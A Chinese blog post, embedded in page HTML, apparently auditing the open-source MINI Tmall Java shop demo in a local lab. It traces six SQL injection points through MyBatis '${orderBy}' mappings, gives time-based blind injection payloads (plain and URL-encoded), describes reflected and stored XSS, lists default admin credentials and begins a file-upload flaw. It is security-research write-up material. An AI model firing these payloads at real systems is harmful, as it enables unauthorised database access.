+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=MINI天猫商城代码审计"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=MINI天猫商城代码审计"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MINI天猫商城代码审计&body=Check out this article: https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=MINI天猫商城代码审计"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=MINI天猫商城代码审计&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/05/10/MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=MINI天猫商城代码审计"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MINI%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">MINI天猫商城代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建与配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E7%A1%AC%E7%BC%96%E7%A0%81%E5%92%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E4%BE%9B%E5%BA%94%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">审计硬编码和使用的供应链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">硬编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%9B%E5%BA%94%E9%93%BE%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">供应链安全</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1owaspTop10%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">审计owaspTop10漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%80%EF%BC%88%E5%90%8E%E5%8F%B0%EF%BC%89"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">SQL注入一（后台）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%BA%8C%EF%BC%88%E5%89%8D%E5%8F%B0%EF%BC%89"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">SQL注入二（前台）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B8%89%EF%BC%88%E5%89%8D%E5%8F%B0%EF%BC%89"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">SQL注入三（前台）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">SQL注入总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E5%8F%8D%E5%B0%84"><span class="toc-number">1.4.2.</span> <span class="toc-text">XSS(反射)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%EF%BC%88%E5%AD%98%E5%82%A8%EF%BC%89"><span class="toc-number">1.4.3.</span> <span class="toc-text">XSS（存储）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.4.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">文件上传1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">文件上传2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">文件上传3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04"><span class="toc-number">1.4.4.4.</span> <span class="toc-text">文件上传4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">1.4.5.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF"><span class="toc-number">1.4.6.</span> <span class="toc-text">SSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">框架漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">1.5.1.</span> <span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j2"><span class="toc-number">1.5.2.</span> <span class="toc-text">log4j2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        MINI天猫商城代码审计
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garckz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-10T02:38:38.000Z" class="dt-published" itemprop="datePublished">2023-05-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="MINI天猫商城代码审计"><a href="#MINI天猫商城代码审计" class="headerlink" title="MINI天猫商城代码审计"></a>MINI天猫商城代码审计</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到很多师傅们，都在做这套tmall系统的代码审计，一时起兴趣，就自己也下载下来进行审一审，全程按照自己的思路去审计分析。在此进行简单的记录。</p>
+<h2 id="环境搭建与配置"><a href="#环境搭建与配置" class="headerlink" title="环境搭建与配置"></a>环境搭建与配置</h2><p>项目地址：<a target="_blank" rel="noopener" href="https://gitee.com/project_team/Tmall_demo">https://gitee.com/project_team/Tmall_demo</a></p>
+<p>配置文件：src&#x2F;main&#x2F;resources&#x2F;application.properties</p>
+<p>修改为自己的数据库地址，也可以修改启动的端口</p>
+<p><img src="A9LKEZadvuLcO8WshiS5_zZu2oQ5uFuwZsIsiBWKutQ.png" alt="image"></p>
+<p>启动文件：src&#x2F;main&#x2F;java&#x2F;com&#x2F;xq&#x2F;tmall&#x2F;TmallSpringBootApplication.java</p>
+<p>待maven加载完依赖之后，在该文件中进行启动项目。</p>
+<p><img src="S4qCXllB0lfY-EYB3VvMopRriHMWrvpgNwjnyxFt2mc.png" alt="image"></p>
+<p>浏览器访问</p>
+<p><img src="sGMZu6i0o4YbnEjwZ8WkzHfvhfnCdM1tu9erfY531HU.png" alt="image"></p>
+<p>当我进行一些功能的操作的时候，发现报错了。</p>
+<p><img src="bRwiZdkeSDU9jSMzbGy8q2itpZdBxABxpjripwgAKA0.png"></p>
+<p>从下面这篇文章找到了解决方法，大概的意思就是我mysql版本较低，有个sql_mode默认没有开启，需要手动开启一下。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hungryquiter/p/16995127.html">https://www.cnblogs.com/hungryquiter/p/16995127.html</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET @@global.sql_mode =<span class="string">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上述配置是临时开启该模式，重mysql之后会消失。</p>
+<h2 id="审计硬编码和使用的供应链"><a href="#审计硬编码和使用的供应链" class="headerlink" title="审计硬编码和使用的供应链"></a>审计硬编码和使用的供应链</h2><h3 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h3><p>直接ctrl+shif+f 全局搜索password 、pass、jdbc等关键字。</p>
+<p>搜索password</p>
+<p><img src="dW055RlSMosFZVq3Bsle4y6ZgLBaFc76sWTt31hvpTo.png" alt="image"></p>
+<p>搜索jdbc</p>
+<p><img src="G0pAhAER4GW7XH0vPkzaFeSJI_ejyw3q2_n5f_LUFZk.png" alt="image"></p>
+<p>上述可看到一些硬编码</p>
+<h3 id="供应链安全"><a href="#供应链安全" class="headerlink" title="供应链安全"></a>供应链安全</h3><p>本项目是使用maven管理，所以直接查看pom.xml文件，分析用了那些依赖以及版本。再去判断是否存在漏洞。</p>
+<p><img src="JaLhHxRPGH2PkAW5npc8PT2CFajmXD_vOXIlKuX9oA4.png" alt="image"></p>
+<p>分析到了druid、fastjson、log4j、springframework.boot等一些比较常见的存在漏洞的组件或框架。</p>
+<p>先对其有大致的了解，后续再深入研究。</p>
+<h2 id="审计owaspTop10漏洞"><a href="#审计owaspTop10漏洞" class="headerlink" title="审计owaspTop10漏洞"></a>审计owaspTop10漏洞</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="SQL注入一（后台）"><a href="#SQL注入一（后台）" class="headerlink" title="SQL注入一（后台）"></a>SQL注入一（后台）</h4><p>分析了一下该项目，发现mybatis的xml文件均存放在&#x2F;Users&#x2F;garck&#x2F;D&#x2F;code&#x2F;java&#x2F;CodeAudit&#x2F;Tmall_demo-master&#x2F;src&#x2F;main&#x2F;resources&#x2F;mybatis&#x2F;mapper中。</p>
+<p>下面直接搜索这个文件夹下面的带有 “$” 符号的xml文件来进行详细分析。</p>
+<p><img src="R5LFjOKJYSV8ZYNvgY1wBB_a6LHJZ6c2R6c3TlBlk0k.png" alt="image"></p>
+<p><img src="RCVvashWJlQe0ZBbzd4B2s9jZJJLnStqrCCiUbiIV7E.png" alt="image"></p>
+<p>SQL语句使用了“$” 符号，就是使用了拼接的方式进行执行。若能够控制传入的数据，且没有过滤的情况下，可构造payload进行SQL注入。</p>
+<p>下面开始分析 ProductMapper.xml的“${orderUtil.orderBy}”</p>
+<p><img src="g58fPkSb12qkbpG9ZTuazo7yl6doXP36ghUfyljL-Aw.png" alt="image"></p>
+<p>这是一个查询的SQL语句，并且绑定的是select方法，且是属于接⼝com.xq.tmall.dao.ProductMapper的select方法</p>
+<p><img src="faR5oAEY5Gu4y1nT1lH9i-JchVHFuBXXuaYyVNm_wNg.png" alt="image"></p>
+<p>查看该接口，确认存在select方法，且传入了OrderUtil参数</p>
+<p><img src="v5616V98pJYf5lR7b-YXr6JcdwNlf4ApqPEcvhYJBe8.png" alt="image"></p>
+<p>搜索哪个地方调用了这个接口的方法，发现接口实现类ProductServiceImpl中有调用</p>
+<p><img src="CJxsIYmAAtLCiNN58-KsMWlhFQYo3IqUOnBUB1HmDGg.png" alt="image"></p>
+<p>详情</p>
+<p><img src="rQ7D9Wcxk6KTbyuhV03hB8WEBYn-xiHUaH4VXWKD1ZE.png" alt="image"></p>
+<p>ProductService接口类声明的getList，同时传入的orderUtil</p>
+<p><img src="PL7q_4fg5FkMFSnz0LHEA8P10jchuNaB14b6ztmWZDM.png" alt="image"></p>
+<p>看一下orderUtil工具类</p>
+<p><img src="4p_n__dpbG5-Tm7F0E1TcTASSkO6PZKBlh1J-olguRM.png" alt="image"></p>
+<p>搜索哪个controller类中调用了ProductServiceImpl的getList方法，分析一下ForeProductListController168行</p>
+<p><img src="R2SbHwlsZsvVw9hhQD1DomChJ51ER_vTUORis7RK5VM.png" alt="image"></p>
+<p>看了一下这个注释，大概是在 获取商品列表的时候需要调用ProductService.getList。</p>
+<p>还原一下接口URL；确认是GET请求，根路径是product</p>
+<p><img src="L_yJC--fe4KS-0Z0R-Ch-vWP-WJQbIZk29h32GCqOXc.png" alt="image"></p>
+<p>产品高级查询功能；product&#x2F;{index}&#x2F;{count}，看到这里之后，凉凉了，orderUtil不可控。</p>
+<p><img src="K4bGIFH65ZSsmckU05MWP8pyWLBxZYAROhKtsDui5yY.png" alt="image"></p>
+<p>继续找其他调用ProductService.getList的controller类；看一下ProductController类的49行，发现传入的orderUtil为null，直接跳过分析下一个。</p>
+<p><img src="NVpD-Nmps9gm3dqPPBGNT-EHJzN7khr0mQ2mea3jrso.png" alt="image"></p>
+<p>ProductController类的405行，</p>
+<p><img src="8dSTKLl4xUWOBIxmVFrKBta2_M9J4d1cL_9qVEk74Z4.png" alt="image"></p>
+<p>结合OrderUtil的构造方法分析，看看有没有传入orderBy和isDesc这两个参数</p>
+<p><img src="_Mzz8zN1vCnyvwngr31N2h-BNbSrmavfTDLX6SrM4v8.png" alt="image"></p>
+<p>发现参数可控，前端传入orderBy参数到该控制层</p>
+<p><img src="13tqRPx3xqZQ83kZtkKTg8HwJbZuCoZ0ognokbRLfR0.png" alt="image"></p>
+<p>构造payload</p>
+<p>admin&#x2F;product&#x2F;{index}&#x2F;{count}，加上一个统一的前缀&#x2F;tmall后继续访问；&#x2F;tmall&#x2F;admin&#x2F;product&#x2F;</p>
+<p><img src="0QG6nM0OaDbiCoTGabMMDLDR5yZTemvwc39QKJw_my0.png" alt="image"></p>
+<p>登录后台。账号：admin.  密码：123456</p>
+<p>因为这里使用了rest风格的URL，理论上说index和count可以随意输入，所以直接构造到的URL为：<a target="_blank" rel="noopener" href="http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1">http://192.168.75.154:8090/tmall/admin/product/1/1?orderBy=1</a></p>
+<p>注入参数：orderBy</p>
+<p><img src="yRIojR8Gm6UI9QON7BC6ZOsalU5du_SjjFsjTqekvmQ.png" alt="image"></p>
+<p>添加单引号</p>
+<p><img src="Nc-FAUCqKvTesqsgAKPDDccRwg-r31LOVF1JA97e260.png" alt="image"></p>
+<p>延迟5秒</p>
+<p><img src="0RPN1gIO7NsY1qs-Y_82bUvR7OLW9PeEhLgawGI_GqE.png" alt="image"></p>
+<p>sqlmap验证</p>
+<p><img src="H5GbOwzVOfd8htyOuM0quyHPGutc1U7XEXMla1pMh4Q.png" alt="image"></p>
+<p>看了一下过滤器，只做了权限校验。没有做SQL注入的过滤，所以只要发现参数可控的注入的即可注入，不需要绕过。</p>
+<p><img src="6QPlX1nJtLPMGa_rnxqVz10dQfyz9wlyxK3TcNhujQM.png" alt="image"></p>
+<h4 id="SQL注入二（前台）"><a href="#SQL注入二（前台）" class="headerlink" title="SQL注入二（前台）"></a>SQL注入二（前台）</h4><p>继续寻找调用了ProductServiceImpl的getList方法的controller</p>
+<p>ProductService.getList</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">----  ForeHomeController    ###调用ProductService.getList时传入为null，不存在注入</span><br><span class="line">---+  ProductController     ###后台注入</span><br><span class="line">---+  ForeProductListController   ###前台注入</span><br><span class="line">----  ForeProductDetailsController   ###调用ProductService.getList时传入为null，不存在注入</span><br></pre></td></tr></table></figure>
+<p>ForeProductListController的168行传入了orderUtil对象。</p>
+<p><img src="1idGrN6XrKL7LK1kDGa1e8j9NGwt2bwwfbkfr500KFM.png" alt="image"></p>
+<p>分析orderUtil对象的来源。</p>
+<p><img src="l6vzVsRfFF5iXLSZGVP_TxXkOWn1tE1votXCQEIebIs.png" alt="image"></p>
+<p><img src="qpm6TF2VikRSreOzScimwNyJBBjwhx6dqqMfmwiJOkg.png" alt="image"></p>
+<p>进行构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.75.154:8090/tmall/product/0/20?orderBy=1 AND (SELECT 3188 FROM (SELECT(SLEEP(5)))KJQA)</span><br></pre></td></tr></table></figure>
+<p><img src="9Z0qgqtR-ynJluX--BI9mg6X_Xq3e8F023Hw3zVtdS4.png" alt="image"></p>
+<p>成功延迟</p>
+<p><img src="aZEjn49GvzMTUfxi6MaanU3wnUu1iI9P2fG6S-XtAko.png" alt="image"></p>
+<h4 id="SQL注入三（前台）"><a href="#SQL注入三（前台）" class="headerlink" title="SQL注入三（前台）"></a>SQL注入三（前台）</h4><p>分析到了利用链：ProductMapper.selectMoreList—ProductService.getMoreList—ForeProductListController(163)。</p>
+<p>需要满足条件：</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">product_name_split不为空</span><br><span class="line">product_name_split.length长度大于1</span><br></pre></td></tr></table></figure>
+<p><img src="b7sJTjIfFVd9cOZv38BpuIYAGEIhcENftkJ7TPbklE8.png" alt="image"></p>
+<p>溯product_name_split的由来</p>
+<p><img src="Pfdv1cTF2FZo2Ke7tId-E9i0c62MyJSvfNtVxpAMOhE.png" alt="image"></p>
+<p>product_name_split &#x3D; product_name.split(“ “);</p>
+<figure class="highlight plaintext"><figcaption><span>Text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product_name 不为空</span><br></pre></td></tr></table></figure>
+<p>分析得知：product_name_split 是通过空格去匹配来切割product_name传入的参数的值来分隔的</p>
+<p><strong>.split</strong>：可以根据匹配给定的正则表达式来拆分字符串</p>
+<p>所以传入的参数需要传入两个，并且使用空格分隔。最终得到的payload</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmall/product/0/20?orderBy=%31%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%28%73%6c%65%65%70%28%35%29%29%29%6d%73%63%70%29&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=%71%77%65%2c%61%73%64%20%7a%78%63</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/tmall/product/0/20?orderBy=1 AND (select 1 from (select (sleep(5)))mscp)&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=qwe,asd zxc</span><br></pre></td></tr></table></figure>
+<p><img src="S5Yz-EHBh8WNg554WYGuoUzqyYWGPaUN7DBpnf9Xqlc.png" alt="image"></p>
+<h4 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h4><p>本系统共审计发现6个SQL注入点且均已验证确认。下面是详细的污点传播链。</p>
+<ul>
+<li>SQL注入1：<br>RewardController(97)–&gt;RewardService.getList–&gt;RewardMapper.select –&gt;RewardMapper.xml(${orderUtil.orderBy})</li>
+<li>SQL注入2：<br>  ForeProductListController(163)–&gt; ProductService.getMoreList–&gt;ProductMapper.selectMoreList–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>
+<li>SQL注入3：<br>ProductController(405)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>
+<li>SQL注入4：<br>ForeProductListController(168)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;ProductMapper.xml(${orderUtil.orderBy})</li>
+<li>SQL注入5：<br>OrderController(176)–&gt;ProductOrderService.getList–&gt;ProductOrderMapper.select–&gt;ProductOrderService.xml(${orderUtil.orderBy})</li>
+<li>SQL注入6：<br>UserController(170)–&gt; UserService.getList–&gt;UserMapper.select–&gt;UserMapper.xml(${orderUtil.orderBy})</li>
+</ul>
+<p><img src="34NeD_tT0kwQbDrFJRE_QOjITFE0pW5d9lUxJk46GdY.png" alt="image"></p>
+<h3 id="XSS-反射"><a href="#XSS-反射" class="headerlink" title="XSS(反射)"></a>XSS(反射)</h3><ul>
+<li>requestScope：是EL表达式中的一个隐含对象，类似request，如：${requestScope.username} 表示在request域中取得username属性所对应的值</li>
+</ul>
+<p>搜索requestScope、map.put。</p>
+<p>触发链：ForeProductListController拿到了product_name后赋值给searchValue，未做处理之后直接map.put传到了request域，转到fore&#x2F;productListPage。</p>
+<p>链为：前端传参–&gt;ForeProductListController–&gt;获取参数–&gt;传到前端–&gt;展示（触发）</p>
+<p><img src="l2l6pMOC1jtn27Xp40uLZxt78j7BHP2Np46Kt31_6bA.png" alt="image"></p>
+<p>productListPage页面直接调用</p>
+<p><img src="XKRQ5fGyAcQ6Oyn6prR1mFeqgc7rg_efCoqkIpoAtVk.png" alt="image"></p>
+<p>验证</p>
+<p><img src="2h3pLjkdR6tzagmMau4Pkb9iIpI1gv7-dHFXlpnKN4s.png" alt="image"></p>
+<p><img src="RIWBAYLT2bE54OXw3PovYEUck53NunG-qcPDtzo6nAU.png" alt="image"></p>
+<h3 id="XSS（存储）"><a href="#XSS（存储）" class="headerlink" title="XSS（存储）"></a>XSS（存储）</h3><p>注册账号</p>
+<p>控制层拿到传入的user_name</p>
+<p><img src="NKIT6LiKZqM12dhte7k7ROSZXik3QcKOPqqlS4pl-z4.png" alt="image"></p>
+<p>创建用户对象，然后将用户对象传入到service层</p>
+<p><img src="oa6gt_8VHLNP-34_WdjujK0C2k9aoggYOy4U30bbUQU.png" alt="image"></p>
+<p>service调用dao层的接口</p>
+<p><img src="GOusN-7mvd-I0Ieeq2K72oFuq4IQdFLjrBhowtCD8Wo.png" alt="image"></p>
+<p><img src="ZA_N5lFepeyPq3aMnxLlfnB9ME77u-zBs9lJ9MhR1_c.png" alt="image"></p>
+<p>最终到了xml配置文件，执行SQL语句的地方，成功插入数据。</p>
+<p><img src="7xInJKQWGyGNz4JZenh61qxTRa2wAJZcfHpzHO2j_M0.png" alt="image"></p>
+<p>burp验证。</p>
+<p><img src="Zpu9O9AW14VXKYEx7BzYkQDW5-xwY3PYBZyDk4wYp5s.png" alt="image"></p>
+<p>看了下数据表，只要名字的长度不超过25就不会报错，不然报服务器500的错误。</p>
+<p><img src="Uih_0Rrw4zcFt1tR6nHq-cNJ5EnpoV7lvz3rwcs2R8Q.png" alt="image"></p>
+<p>登录账号之后触发。有一个页面是去获取数据库中存储的用户名的。所以登录之后直接出发XSS。</p>
+<p><img src="URvs16uQc_xgZ63ndFX3e_dWHCTLUd6Ako53blYkBJw.png" alt="image"></p>
+<p>触发链：</p>
+<p>访问tmall&#x2F;login，即可访问到ForeLoginController控制层的login，重定向到 fore&#x2F;loginPage</p>
+<p><img src="b4ufrbzQy2x1NNy3RjihfaBjnrIq7nFLYyWvq-bMoaQ.png" alt="image"></p>
+<p>登录页面的loginPage.jsp</p>
+<p><img src="Zoz2dHy4yuIJqg7zDzSdPSa282T6zWwUpYWbK8d6nqI.png" alt="image"></p>
+<p>调用了fore_login.js；如果后端响应返回成功，则访问&#x2F;tmall</p>
+<p><img src="7xY6hv2tiXTz0c0gGRYRa_W9rQZNGeecvgduRWflQU0.png" alt="image"></p>
+<p>登录成功返回</p>
+<p><img src="1rLYOoBiy_GcuM6mYL5R-Il8_O-bLqZDmTQJ8DakTPE.png" alt="image"></p>
+<p>主页，取出前面登录成功存进去的userId，判断用户是否登录。如果已经登录则把整改user对象传到Request。map.put(“user”, user)；其中user对象的数据会调用service层的userService.get，service会调用dao的userMapper.selectOne，selectOne去数据库根据这个userId查询信息。返回后封装成User对象。</p>
+<p><img src="0HfOGkNMdZwCSNwAIPyYOkjrtm4I-V9v9_Qh1X59M9A.png" alt="image"></p>
+<p>执行完上面的之后，跳转到fore&#x2F;homePage；homePage里面又包含了navigator.jsp</p>
+<p><img src="_16A5IdHxBc5eMux8NY-ORAkXOKUFKpPN0kulPfqTF0.png" alt="image"></p>
+<p>navigator.jsp触发</p>
+<p><img src="3TSQXgEcJ9Y56MH6f9rwmdLFzuBqf9_n_OLr_vL0gFo.png" alt="image"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="文件上传1"><a href="#文件上传1" class="headerlink" title="文件上传1"></a>文件上传1</h4><p>全局搜索upload</p>
+<p><img src="5jCZfY_15FLJfaHu_nYLsj3Fs4II2jM7wEaQdG7F1uc.png" alt="image"></p>
+<p>发现头像上传的controller，且不存在过滤。</p>
